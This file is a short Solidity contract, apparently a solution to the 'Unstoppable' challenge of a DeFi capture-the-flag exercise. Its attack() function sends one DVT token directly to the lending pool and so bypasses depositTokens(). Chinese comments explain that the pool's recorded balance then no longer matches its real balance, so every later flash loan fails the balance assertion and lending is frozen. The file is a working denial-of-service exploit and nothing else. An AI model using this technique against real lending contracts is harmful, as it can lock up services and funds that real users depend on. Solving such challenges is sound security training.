// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract UnstoppableAttack {
    address pool;
    address dvt;
    
    constructor(address _pool, address _dvt) public {
        pool = _pool;
        dvt = _dvt;
    }
    
    function attack() external {
        // 直接转账 1 DVT 给池子，绕开 depositTokens()
        // poolBalance 不会被更新，但实际余额变了
        // 下次 flashLoan 触发 assert(poolBalance == balanceBefore) 必失败
        IERC20(dvt).transfer(pool, 1);
    }
}
